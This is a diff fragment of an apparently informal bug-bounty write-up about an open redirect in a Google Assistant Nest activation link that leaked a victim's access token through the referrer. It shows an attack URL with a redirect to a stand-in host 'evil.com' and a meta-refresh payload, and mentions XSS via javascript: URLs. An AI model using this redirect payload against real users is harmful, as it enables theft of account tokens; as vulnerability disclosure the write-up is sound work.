@@ -23,7 +23,7 @@ if you ever hunted in business.google.com then you have seen that they got an op
  the attack flow was follow: 
  I: providing the victim the with assistant.google.com/services/adapters/nest/activate?activateuid=54zae465az-54aze54a&redirect_url=evil.Coml which has an evil redirecting, 
  II: google authorizationapp was not checking the redirecting hence the victim's access token was leaking in referrer.
- the redireting was coming back through <pre><meta http-equiv="refresh" content="0;URL='evil.com'" />   </pre>
+ the redireting was coming back through <xmp><meta http-equiv="refresh" content="0;URL='evil.com'" />   </xmp>
  you'd have been able to XSS the matter before few years ago, as most browsers now refusing to refresh to a javascript: URL.
  <img src=https://i.imgur.com/urzAIDu.png>
  anyway, this XSS wasnt rewarded. but leaking the nest access token was, sometimes having google products/devices gives you advantges.
